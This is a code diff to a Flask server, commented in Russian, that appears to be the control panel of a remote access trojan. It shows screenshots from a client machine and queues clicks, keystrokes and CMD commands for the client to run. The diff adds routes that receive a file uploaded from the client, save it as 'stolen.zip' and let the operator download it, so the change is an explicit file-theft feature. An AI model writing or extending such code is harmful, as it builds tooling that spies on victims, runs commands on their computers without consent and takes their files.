@@ -5,6 +5,7 @@ app = Flask(__name__)
 
 latest_screenshot = 'screen.jpg'
 commands = []
+file_to_download = None
 
 HTML_ADMIN = """
 <!DOCTYPE html>
@@ -17,8 +18,11 @@ HTML_ADMIN = """
     </div>
     <br><br>
     <input type="text" id="cmd" placeholder="Команда или текст..." style="padding:10px; width:300px;">
-    <button onclick="sendKey()" style="padding:10px;">Отправить</button>
+    <button onclick="sendKey()" style="padding:10px;">Отправить текст</button>
     <button onclick="sendCmd()" style="padding:10px; background:orange;">Выполнить в CMD</button>
+    
+    <br><br>
+    <a href="/get_file" style="color:yellow;">📁 Забрать файл (из C:\Temp\out.zip)</a>
     
     <script>
         function refreshImg() {
@@ -31,30 +35,18 @@ HTML_ADMIN = """
             var rect = img.getBoundingClientRect();
             var x = (e.clientX - rect.left) / rect.width;
             var y = (e.clientY - rect.top) / rect.height;
-            fetch('/click', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({x: x, y: y})
-            });
+            fetch('/click', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({x: x, y: y}) });
         }
 
         function sendKey() {
             var text = document.getElementById('cmd').value;
-            fetch('/type', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({text: text})
-            });
+            fetch('/type', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({text: text}) });
             document.getElementById('cmd').value = '';
         }
         
         function sendCmd() {
             var text = document.getElementById('cmd').value;
-            fetch('/run_cmd', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({cmd: text})
-            });
+            fetch('/run_cmd', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cmd: text}) });
         }
     </script>
 </body>
@@ -80,10 +72,8 @@ def index():
 
 @app.route('/get_screen')
 def get_screen():
-    try:
-        return send_file(latest_screenshot, mimetype='image/jpeg')
-    except:
-        return "Нет данных"
+    try: return send_file(latest_screenshot, mimetype='image/jpeg')
+    except: return "Нет данных"
 
 @app.route('/upload_screen', methods=['POST'])
 def upload_screen():
@@ -96,8 +86,7 @@ def upload_screen():
 def get_commands():
     global commands
     if commands:
-        cmd = commands.pop(0)
-        return cmd
+        return commands.pop(0)
     return "NONE"
 
 @app.route('/click', methods=['POST'])
@@ -117,6 +106,22 @@ def run_cmd():
     data = request.json
     commands.append(f"CMD|{data['cmd']}")
     return "OK"
+
+# Новый маршрут: скачивание файла с клиента
+@app.route('/upload_file', methods=['POST'])
+def upload_file_from_client():
+    global file_to_download
+    file = request.files['file']
+    file_to_download = 'stolen.zip'
+    file.save(file_to_download)
+    return "OK"
+
+@app.route('/get_file')
+def get_file():
+    global file_to_download
+    if file_to_download and os.path.exists(file_to_download):
+        return send_file(file_to_download, as_attachment=True, download_name='stolen.zip')
+    return "Файла нет"
 
 @app.route('/download')
 def download():
